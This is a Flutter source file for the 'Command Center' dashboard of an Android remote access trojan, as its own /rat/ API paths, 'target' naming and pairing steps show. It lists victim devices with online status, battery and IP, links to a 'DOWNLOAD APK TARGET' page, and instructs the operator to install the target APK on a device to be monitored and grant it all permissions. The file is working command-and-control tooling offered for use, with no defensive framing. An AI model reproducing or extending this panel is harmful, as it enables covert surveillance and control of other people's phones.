import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:ui';
import 'package:video_player/video_player.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:flutter/services.dart';
import 'package:url_launcher/url_launcher.dart';

// ═══════════════════════════════════════════════════════════════════════════
// THEME CONSTANTS — Synchronized with YakuzaXsilence Design System
// ═══════════════════════════════════════════════════════════════════════════
class _C {
  static const bg      = Color(0xFF000000);
  static const bg2     = Color(0xFF0a0a0a);
  static const surface = Color(0xFF111111);
  static const card    = Color(0xFF111111);
  static const accent  = Color(0xFFFF3B30);
  static const accent2 = Color(0xFFFF6B6B);
  static const accent3 = Color(0xFFCC2E25);
  static const text    = Color(0xFFE0E7FF);
  static const muted   = Color(0x73E0E7FF);
  static const muted2  = Color(0x38E0E7FF);
  static const border  = Color(0x1AFF3B30);
  static const border2 = Color(0x0FFFFFFF);
  static const gold    = Color(0xFF333333);
  static const green   = Color(0xFFFF3B30);
  static const danger  = Color(0xFFFF3B30);
}

class DeviceDashboardPage extends StatefulWidget {

  final String username;
  final String sessionKey; 

  DeviceDashboardPage({super.key, required this.username, required this.sessionKey});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  // ── Video Background ──
  late VideoPlayerController _bgVideoController;
  bool _bgVideoReady = false;

  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  late VideoPlayerController _videoController;
  bool _videoInitialized = false;
  bool _videoError = false;

  final TextEditingController _searchController = TextEditingController();
  String _searchQuery = "";

  // Socket.IO config
  late IO.Socket _socket;

  // ── Pairing ID ──
  String _pairId = '';
  int _currentPage = 0;
  late PageController _pageController;

  static const String _kBase = 'https://omhc-host-premium.yakuza.biz.id';

  @override
  void initState() {
    super.initState();
    _initBgVideo();
    _initializeVideo();
    _pageController = PageController(initialPage: 0);
    _fetchAll();
    _initSocket();
    
    _timer = Timer.periodic(Duration(seconds: 10), (timer) {
      if (mounted) setState(() {});
    });
    
    _searchController.addListener(() {
      setState(() {
        _searchQuery = _searchController.text;
      });
    });
  }

  // ── Socket.IO ────────────────────────────────────────────────────────────

  void _initSocket() {
    try {
      _socket = IO.io(
        'https://omhc-host-premium.yakuza.biz.id',
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL_${widget.username}'})
            .enableAutoConnect()
            .build(),
      );

      _socket.onConnect((_) {
        debugPrint("[+] Admin Socket Connected to Dashboard");
      });

      _socket.on('target_status', (data) {
        if (mounted) {
          setState(() {
            int index = _devices.indexWhere((d) => d['id'] == data['id']);
            if (index != -1) {
              _devices[index]['status'] = data['status'].toString().toLowerCase() == 'online' ? 'Online' : 'Offline';
              if (data['status'].toString().toLowerCase() == 'online') {
                _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
              }
            }
          });
        }
      });

      _socket.on('heartbeat', (data) {
        if (mounted) {
          setState(() {
            int index = _devices.indexWhere((d) => d['id'] == data['deviceId']);
            if (index != -1) {
              _devices[index]['battery'] = data['battery'];
              _devices[index]['status'] = 'Online';
              _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
            }
          });
        }
      });

      _socket.on('device_info', (data) {
        if (mounted && data['admin'] == widget.username) {
          _fetchDevices();
        }
      });

      _socket.connect();
    } catch (e) {
      debugPrint("Socket error: $e");
    }
  }

  // ── Video Background ────────────────────────────────────────────────────

  void _initializeVideo() {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize().then((_) {
          if (mounted) {
            setState(() {
              _videoInitialized = true;
            });
            _videoController.setLooping(true);
            _videoController.play();
            _videoController.setVolume(0);
          }
        }).catchError((error) {
          debugPrint('Video initialization error: $error');
          if (mounted) setState(() => _videoError = true);
        });
    } catch (e) {
      debugPrint('Video controller creation error: $e');
      if (mounted) setState(() => _videoError = true);
    }
  }

  @override
  void dispose() {
    _timer?.cancel();
    _pageController.dispose();
    _socket.disconnect();
    _socket.dispose();
    _videoController.dispose();
    _searchController.dispose();
    _bgVideoController.dispose();
    super.dispose();
  }

  // ── API ──────────────────────────────────────────────────────────────────

  Future<void> _fetchAll() async {
    await _fetchPairId();
    await _fetchDevices();
  }

  Future<void> _fetchPairId() async {
    try {
      final res = await http.get(
        Uri.parse('$_kBase/rat/pairid?key=${Uri.encodeComponent(widget.sessionKey)}'),
      );
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true && data['pairId'] != null) {
          if (mounted) {
            setState(() {
              _pairId = data['pairId'].toString();
            });
          }
        }
      }
    } catch (e) {
      debugPrint("Error fetching pairId: $e");
    }
  }

  Future<void> _fetchDevices() async {
    try {
      final response = await http.get(
        Uri.parse("$_kBase/rat/my-devices?key=${Uri.encodeComponent(widget.sessionKey)}"),
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (mounted) {
          setState(() {
            // /rat/my-devices returns { valid, pairId, role, devices }
            _devices = data['devices'] ?? data ?? [];
            if (data['pairId'] != null && _pairId.isEmpty) {
              _pairId = data['pairId'].toString();
            }
            _isLoading = false;
          });
        }
      } else {
        // Fallback to /api/list-targets if /rat/my-devices fails
        final fallbackRes = await http.get(
          Uri.parse("$_kBase/api/list-targets?key=${Uri.encodeComponent(widget.sessionKey)}"),
        );
        if (fallbackRes.statusCode == 200 && mounted) {
          setState(() {
            _devices = jsonDecode(fallbackRes.body);
            _isLoading = false;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
      if (mounted) {
        setState(() => _isLoading = false);
      }
    }
  }

  List<dynamic> get _filteredDevices {
    if (_searchQuery.isEmpty) return _devices;
    return _devices.where((d) {
      String searchStr = "${d['model']} ${d['id']} ${d['ip']}".toLowerCase();
      return searchStr.contains(_searchQuery.toLowerCase());
    }).toList();
  }

  bool _isDeviceReallyOnline(dynamic device) {
    if (device['status'] == 'Offline') return false;
    if (device['lastSeen'] == null) return false;

    try {
      DateTime lastSeen = DateTime.parse(device['lastSeen'].toString());
      DateTime now = DateTime.now();
      if (now.difference(lastSeen).inSeconds > 20) {
        return false;
      }
      return true;
    } catch (e) {
      return false;
    }
  }

  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text('Pairing ID copied!', style: TextStyle(fontFamily: 'ShareTechMono')),
        backgroundColor: _C.accent.withOpacity(0.9),
        duration: Duration(seconds: 2),
        behavior: SnackBarBehavior.floating,
      ),
    );
  }

  // ── Build ────────────────────────────────────────────────────────────────

  @override

  // ── Video Background ──────────────────────────────────────
  void _initBgVideo() {
    _bgVideoController = VideoPlayerController.asset('assets/videos/bg_video.mp4')
      ..initialize().then((_) {
        if (mounted) {
          setState(() => _bgVideoReady = true);
          _bgVideoController.play();
          _bgVideoController.setLooping(true);
          _bgVideoController.setVolume(0.0);
        }
      }).catchError((e) {
        debugPrint('BG video error: $e');
      });
  }

  Widget build(BuildContext context) {
    int totalCount = _devices.length;
    int activeCount = _devices.where((d) => _isDeviceReallyOnline(d)).length; 
    int offlineCount = totalCount - activeCount;
    final filteredList = _filteredDevices;

return Stack(
      children: [
        // ── Video Background ──
        if (_bgVideoReady && _bgVideoController.value.isInitialized)
          SizedBox.expand(
            child: FittedBox(
              fit: BoxFit.cover,
              child: SizedBox(
                width: _bgVideoController.value.size.width,
                height: _bgVideoController.value.size.height,
                child: VideoPlayer(_bgVideoController),
              ),
            ),
          )
        else
          Container(
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
                colors: [Color(0xFF000000), Color(0xFF0a0a0a), Color(0xFF111111)],
              ),
            ),
          ),
        // ── Dark overlay ──
        Container(color: Colors.black.withOpacity(0.6)),
        // ── Page content ──
      Scaffold(
      backgroundColor: Colors.transparent, 
      body: Stack(
        children: [
          // Video background
          if (_videoInitialized && !_videoError)
            SizedBox.expand(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _videoController.value.size.width,
                  height: _videoController.value.size.height,
                  child: VideoPlayer(_videoController),
                ),
              ),
            )
          else
            Container(color: Color(0xFF0F1A15)), 

          // Blur overlay
          BackdropFilter(
            filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
            child: Container(color: Colors.black.withOpacity(0.6)),
          ),

          SafeArea(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // ── Header ──
                Container(
                  margin: const EdgeInsets.fromLTRB(14, 12, 14, 0),
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: Colors.black.withOpacity(0.5),
                    borderRadius: BorderRadius.circular(18),
                    border: Border.all(color: _C.accent.withOpacity(0.2), width: 1),
                    boxShadow: [
                      BoxShadow(
                        color: _C.accent.withOpacity(0.05),
                        blurRadius: 20,
                        spreadRadius: 1,
                      ),
                    ],
                  ),
                  child: Row(
                    children: [
                      // Back button
                      GestureDetector(
                        onTap: () => Navigator.of(context).pop(),
                        child: Container(
                          width: 38,
                          height: 38,
                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.05),
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(color: Colors.white.withOpacity(0.1)),
                          ),
                          child: Icon(Icons.arrow_back_ios_new_rounded, color: _C.muted, size: 14),
                        ),
                      ),
                      SizedBox(width: 12),
                      // Title icon
                      Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: _C.accent.withOpacity(0.12),
                          borderRadius: BorderRadius.circular(12),
                          border: Border.all(color: _C.accent.withOpacity(0.25)),
                        ),
                        child: Icon(Icons.security_rounded, color: _C.accent, size: 20),
                      ),
                      SizedBox(width: 12),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              "COMMAND CENTER",
                              style: TextStyle(
                                color: _C.text,
                                fontFamily: 'MADEEvolveSansEVO',
                                fontSize: 15,
                                fontWeight: FontWeight.bold,
                                letterSpacing: 1.5,
                              ),
                            ),
                            SizedBox(height: 2),
                            Text(
                              "Device Management - ${widget.username.toUpperCase()}",
                              style: TextStyle(
                                color: _C.muted2,
                                fontFamily: 'ShareTechMono',
                                fontSize: 9,
                                letterSpacing: 1.5,
                              ),
                            ),
                          ],
                        ),
                      ),
                      // Refresh button
                      GestureDetector(
                        onTap: () {
                          setState(() => _isLoading = true);
                          _fetchAll();
                        },
                        child: Container(
                          width: 38,
                          height: 38,
                          decoration: BoxDecoration(
                            color: _C.surface,
                            borderRadius: BorderRadius.circular(10),
                            border: Border.all(color: _C.border2),
                          ),
                          child: Icon(Icons.refresh_rounded, color: _C.muted, size: 15),
                        ),
                      ),
                    ],
                  ),
                ),

                SizedBox(height: 8),

                // ── Page Indicator Dots ──
                Center(
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      _buildPageDot(0, "PAIRING"),
                      SizedBox(width: 12),
                      _buildPageDot(1, "DEVICES"),
                    ],
                  ),
                ),

                SizedBox(height: 8),

                // ── PageView: Pairing Info + Device List ──
                Expanded(
                  child: PageView(
                    controller: _pageController,
                    onPageChanged: (i) => setState(() => _currentPage = i),
                    children: [
                      // ── PAGE 0: Pairing Info ──
                      _buildPairingPage(),
                      // ── PAGE 1: Device List ──
                      _buildDeviceListPage(totalCount, activeCount, offlineCount, filteredList),
                    ],
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    ),
      ],
      );
  }

  // ── Page Indicator Dot ──
  Widget _buildPageDot(int index, String label) {
    bool isActive = _currentPage == index;
    return GestureDetector(
      onTap: () {
        _pageController.animateToPage(index, duration: Duration(milliseconds: 300), curve: Curves.easeInOut);
      },
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
        decoration: BoxDecoration(
          color: isActive ? _C.accent.withOpacity(0.15) : Colors.transparent,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: isActive ? _C.accent.withOpacity(0.5) : _C.border2,
            width: 1,
          ),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 7,
              height: 7,
              decoration: BoxDecoration(
                color: isActive ? _C.accent : _C.muted2,
                shape: BoxShape.circle,
                boxShadow: isActive ? [BoxShadow(color: _C.accent.withOpacity(0.5), blurRadius: 5)] : [],
              ),
            ),
            SizedBox(width: 6),
            Text(
              label,
              style: TextStyle(
                color: isActive ? _C.text : _C.muted2,
                fontSize: 10,
                fontWeight: isActive ? FontWeight.bold : FontWeight.normal,
                fontFamily: 'ShareTechMono',
                letterSpacing: 1.5,
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ── Pairing Info Page ──
  Widget _buildPairingPage() {
    return SingleChildScrollView(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
      child: Column(
        children: [
          // ── Pairing Code Card ──
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.5),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: _C.accent.withOpacity(0.3), width: 1.5),
              boxShadow: [
                BoxShadow(color: _C.accent.withOpacity(0.08), blurRadius: 25, spreadRadius: 2),
              ],
            ),
            child: Column(
              children: [
                // Lock icon
                Container(
                  padding: const EdgeInsets.all(14),
                  decoration: BoxDecoration(
                    color: _C.accent.withOpacity(0.12),
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(color: _C.accent.withOpacity(0.3)),
                  ),
                  child: Icon(Icons.key_rounded, color: _C.accent, size: 32),
                ),
                SizedBox(height: 16),

                Text(
                  "PAIRING ID",
                  style: TextStyle(
                    color: _C.muted,
                    fontFamily: 'ShareTechMono',
                    fontSize: 11,
                    letterSpacing: 3,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                SizedBox(height: 12),

                // Pairing code display
                if (_pairId.isNotEmpty)
                  Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 18, horizontal: 16),
                    decoration: BoxDecoration(
                      color: _C.surface,
                      borderRadius: BorderRadius.circular(14),
                      border: Border.all(color: _C.accent.withOpacity(0.25)),
                    ),
                    child: SelectableText(
                      _pairId,
                      textAlign: TextAlign.center,
                      style: TextStyle(
                        color: _C.accent2,
                        fontFamily: 'ShareTechMono',
                        fontSize: 22,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 3,
                      ),
                    ),
                  )
                else
                  Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 18),
                    decoration: BoxDecoration(
                      color: _C.surface,
                      borderRadius: BorderRadius.circular(14),
                      border: Border.all(color: _C.border2),
                    ),
                    child: Text(
                      "Loading...",
                      textAlign: TextAlign.center,
                      style: TextStyle(color: _C.muted2, fontFamily: 'ShareTechMono', fontSize: 16),
                    ),
                  ),

                SizedBox(height: 16),

                // Copy button
                GestureDetector(
                  onTap: _copyPairId,
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(
                      color: _C.accent,
                      borderRadius: BorderRadius.circular(14),
                      boxShadow: [BoxShadow(color: _C.accent.withOpacity(0.3), blurRadius: 12)],
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.copy_rounded, color: Colors.white, size: 16),
                        SizedBox(width: 8),
                        Text(
                          "COPY PAIRING ID",
                          style: TextStyle(
                            color: Colors.white,
                            fontFamily: 'MADEEvolveSansEVO',
                            fontSize: 13,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1.5,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),

                SizedBox(height: 12),

                // Refresh pairId button
                GestureDetector(
                  onTap: () => _fetchPairId(),
                  child: Container(
                    padding: const EdgeInsets.symmetric(vertical: 10, horizontal: 16),
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.05),
                      borderRadius: BorderRadius.circular(10),
                      border: Border.all(color: _C.border2),
                    ),
                    child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Icon(Icons.refresh_rounded, color: _C.muted, size: 14),
                        SizedBox(width: 6),
                        Text(
                          "Refresh",
                          style: TextStyle(color: _C.muted, fontFamily: 'ShareTechMono', fontSize: 11),
                        ),
                      ],
                    ),
                  ),
                ),

                SizedBox(height: 12),

                // ── DOWNLOAD APK TARGET button ──
                GestureDetector(
                  onTap: () async {
                    final uri = Uri.parse('https://yakuza-rat.vercel.app');
                    if (await canLaunchUrl(uri)) {
                      await launchUrl(uri, mode: LaunchMode.externalApplication);
                    } else {
                      ScaffoldMessenger.of(context).showSnackBar(SnackBar(
                        content: Text('Could not open download page', style: TextStyle(fontFamily: 'ShareTechMono')),
                        backgroundColor: Color(0xFFFF3B30),
                      ));
                    }
                  },
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(vertical: 14),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [_C.accent, _C.accent2],
                        begin: Alignment.centerLeft,
                        end: Alignment.centerRight,
                      ),
                      borderRadius: BorderRadius.circular(14),
                      boxShadow: [BoxShadow(color: _C.accent.withOpacity(0.3), blurRadius: 12)],
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.download_rounded, color: Colors.white, size: 18),
                        SizedBox(width: 8),
                        Text(
                          "DOWNLOAD APK TARGET",
                          style: TextStyle(
                            color: Colors.white,
                            fontFamily: 'MADEEvolveSansEVO',
                            fontSize: 13,
                            fontWeight: FontWeight.bold,
                            letterSpacing: 1.5,
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ],
            ),
          ),

          SizedBox(height: 16),

          // ── Tutorial Steps ──
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(18),
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.4),
              borderRadius: BorderRadius.circular(18),
              border: Border.all(color: _C.border2),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Icon(Icons.school_rounded, color: _C.accent, size: 18),
                    SizedBox(width: 8),
                    Text(
                      "HOW TO PAIR",
                      style: TextStyle(
                        color: _C.text,
                        fontFamily: 'MADEEvolveSansEVO',
                        fontSize: 13,
                        fontWeight: FontWeight.bold,
                        letterSpacing: 2,
                      ),
                    ),
                  ],
                ),
                SizedBox(height: 14),
                _buildStep(1, "Install the target APK on the device you want to monitor."),
                _buildStep(2, "Open the target APK and enter this Pairing ID."),
                _buildStep(3, "Grant all requested permissions on the target device."),
                _buildStep(4, "Device will appear in the DEVICES tab. Done!"),
              ],
            ),
          ),

          SizedBox(height: 16),

          // ── Security Notice ──
          Container(
            width: double.infinity,
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(
              color: _C.accent.withOpacity(0.06),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: _C.accent.withOpacity(0.15)),
            ),
            child: Row(
              children: [
                Icon(Icons.shield_rounded, color: _C.accent, size: 20),
                SizedBox(width: 10),
                Expanded(
                  child: Text(
                    "Keep your Pairing ID secret. Anyone with this code can connect a device to your panel.",
                    style: TextStyle(
                      color: _C.muted,
                      fontFamily: 'ShareTechMono',
                      fontSize: 10,
                      letterSpacing: 0.5,
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStep(int num, String text) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 12),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            width: 24,
            height: 24,
            decoration: BoxDecoration(
              color: _C.accent.withOpacity(0.15),
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: _C.accent.withOpacity(0.3)),
            ),
            child: Center(
              child: Text(
                num.toString(),
                style: TextStyle(
                  color: _C.accent,
                  fontFamily: 'ShareTechMono',
                  fontSize: 11,
                  fontWeight: FontWeight.bold,
                ),
              ),
            ),
          ),
          SizedBox(width: 10),
          Expanded(
            child: Text(
              text,
              style: TextStyle(
                color: _C.text,
                fontFamily: 'ShareTechMono',
                fontSize: 11,
                letterSpacing: 0.3,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ── Device List Page ──
  Widget _buildDeviceListPage(int totalCount, int activeCount, int offlineCount, List<dynamic> filteredList) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        // ── Stats Row ──
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 14),
          child: Row(
            children: [
              _buildStatBox("TOTAL", totalCount.toString(), _C.text, _C.card),
              SizedBox(width: 10),
              _buildStatBox("ONLINE", activeCount.toString(), _C.green, _C.green.withOpacity(0.12)),
              SizedBox(width: 10),
              _buildStatBox("OFFLINE", offlineCount.toString(), _C.danger, _C.danger.withOpacity(0.12)),
            ],
          ),
        ),

        SizedBox(height: 12),

        // ── Search Bar ──
        Padding(
          padding: const EdgeInsets.symmetric(horizontal: 14),
          child: Container(
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.4),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(color: _C.border2),
            ),
            padding: const EdgeInsets.fromLTRB(14, 3, 3, 3),
            child: TextField(
              controller: _searchController,
              style: TextStyle(color: _C.text, fontFamily: 'ShareTechMono', fontSize: 13, letterSpacing: 0.5),
              cursorColor: _C.accent,
              decoration: InputDecoration(
                hintText: "Search device, IP, ID...",
                hintStyle: TextStyle(color: _C.muted2, fontFamily: 'ShareTechMono', fontSize: 13),
                prefixIcon: Icon(Icons.search_rounded, color: _C.muted2, size: 18),
                border: InputBorder.none,
                contentPadding: const EdgeInsets.symmetric(vertical: 14),
              ),
            ),
          ),
        ),

        SizedBox(height: 10),

        // ── Device List ──
        Expanded(
          child: _isLoading 
            ? Center(child: CircularProgressIndicator(color: _C.accent))
            : filteredList.isEmpty 
              ? Center(
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Container(
                        padding: const EdgeInsets.all(20),
                        decoration: BoxDecoration(
                          color: Colors.black.withOpacity(0.3),
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(color: _C.border2),
                        ),
                        child: Column(
                          children: [
                            Icon(Icons.devices_other_rounded, color: _C.muted2, size: 40),
                            SizedBox(height: 12),
                            Text(
                              "NO DEVICES FOUND",
                              style: TextStyle(
                                color: _C.muted,
                                fontFamily: 'MADEEvolveSansEVO',
                                fontSize: 12,
                                fontWeight: FontWeight.bold,
                                letterSpacing: 2,
                              ),
                            ),
                            SizedBox(height: 6),
                            Text(
                              "Swipe to PAIRING tab to get your code",
                              style: TextStyle(color: _C.muted2, fontFamily: 'ShareTechMono', fontSize: 10, letterSpacing: 1),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                )
              : ListView.builder(
                  padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 5),
                  itemCount: filteredList.length,
                  itemBuilder: (context, index) {
                    final device = filteredList[index];
                    bool isActive = _isDeviceReallyOnline(device); 
                    Color glowColor = isActive ? _C.green : _C.danger;

                    return GestureDetector(
                      onTap: () {
                        Navigator.pushNamed(
                          context, 
                          '/control_panel', 
                          arguments: {
                            "device": device,
                            "operator": widget.username,
                            "sessionKey": widget.sessionKey
                          } 
                        );
                      },
                      child: Container(
                        margin: const EdgeInsets.only(bottom: 10),
                        padding: const EdgeInsets.all(14),
                        decoration: BoxDecoration(
                          color: Colors.black.withOpacity(0.5),
                          borderRadius: BorderRadius.circular(16),
                          border: Border.all(
                            color: isActive ? glowColor.withOpacity(0.3) : _C.border2,
                            width: 1,
                          ),
                          boxShadow: isActive ? [
                            BoxShadow(
                              color: glowColor.withOpacity(0.06),
                              blurRadius: 15,
                              spreadRadius: 1,
                            )
                          ] : [],
                        ),
                        child: Row(
                          children: [
                            // Device icon
                            Container(
                              padding: const EdgeInsets.all(10),
                              decoration: BoxDecoration(
                                color: isActive ? glowColor.withOpacity(0.12) : Colors.white.withOpacity(0.04),
                                borderRadius: BorderRadius.circular(12),
                                border: Border.all(
                                  color: isActive ? glowColor.withOpacity(0.4) : Colors.transparent,
                                ),
                              ),
                              child: Icon(Icons.phone_android_rounded, color: isActive ? glowColor : _C.muted2, size: 18),
                            ),
                            SizedBox(width: 14),
                            
                            // Device info
                            Expanded(
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  Text(
                                    device['model'] ?? "Unknown Device",
                                    style: TextStyle(
                                      color: _C.text,
                                      fontSize: 13,
                                      fontWeight: FontWeight.bold,
                                      fontFamily: 'ShareTechMono',
                                      letterSpacing: 0.5,
                                    ),
                                    maxLines: 1,
                                    overflow: TextOverflow.ellipsis,
                                  ),
                                  SizedBox(height: 4),
                                  Row(
                                    children: [
                                      Text(
                                        device['release'] != null ? "Android ${device['release']}" : "Android OS",
                                        style: TextStyle(color: _C.muted2, fontSize: 10, fontFamily: 'ShareTechMono'),
                                      ),
                                      SizedBox(width: 8),
                                      Icon(Icons.wifi_rounded, color: isActive ? glowColor.withOpacity(0.5) : _C.muted2, size: 11),
                                    ],
                                  ),
                                ],
                              ),
                            ),

                            // Status & battery
                            Column(
                              crossAxisAlignment: CrossAxisAlignment.end,
                              children: [
                                Row(
                                  children: [
                                    Container(
                                      width: 7,
                                      height: 7,
                                      decoration: BoxDecoration(
                                        color: glowColor,
                                        shape: BoxShape.circle,
                                        boxShadow: [
                                          BoxShadow(color: glowColor.withOpacity(0.5), blurRadius: 5, spreadRadius: 1),
                                        ],
                                      ),
                                    ),
                                    SizedBox(width: 5),
                                    Text(
                                      isActive ? "Online" : "Offline",
                                      style: TextStyle(
                                        color: isActive ? _C.green : _C.muted2,
                                        fontSize: 11,
                                        fontWeight: FontWeight.w600,
                                        fontFamily: 'ShareTechMono',
                                      ),
                                    ),
                                  ],
                                ),
                                SizedBox(height: 6),
                                Row(
                                  children: [
                                    Icon(
                                      Icons.battery_charging_full_rounded,
                                      color: (device['battery'] != null && int.tryParse(device['battery'].toString()) != null && int.parse(device['battery'].toString()) <= 20)
                                          ? _C.danger
                                          : _C.muted2,
                                      size: 11,
                                    ),
                                    SizedBox(width: 4),
                                    Text(
                                      "${device['battery'] ?? '0'}%", 
                                      style: TextStyle(
                                        color: (device['battery'] != null && int.tryParse(device['battery'].toString()) != null && int.parse(device['battery'].toString()) <= 20)
                                            ? _C.danger
                                            : _C.muted2,
                                        fontSize: 10,
                                        fontFamily: 'ShareTechMono',
                                      ),
                                    ),
                                  ],
                                ),
                              ],
                            ),
                            
                            SizedBox(width: 10),
                            Icon(Icons.arrow_forward_ios_rounded, color: _C.muted2.withOpacity(0.4), size: 12),
                          ],
                        ),
                      ),
                    );
                  },
                ),
        ),
      ],
    );
  }

  // ── Stat Box ─────────────────────────────────────────────────────────────

  Widget _buildStatBox(String title, String value, Color valueColor, Color bgColor) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
        decoration: BoxDecoration(
          color: bgColor,
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: _C.border2),
        ),
        child: Column(
          children: [
            Text(
              value,
              style: TextStyle(
                fontFamily: 'MADEEvolveSansEVO',
                color: valueColor,
                fontSize: 18,
                fontWeight: FontWeight.bold,
              ),
            ),
            SizedBox(height: 3),
            Text(
              title,
              style: TextStyle(
                fontFamily: 'ShareTechMono',
                color: _C.muted,
                fontSize: 9,
                letterSpacing: 1.5,
              ),
            ),
          ],
        ),
      ),
    );
  }
}
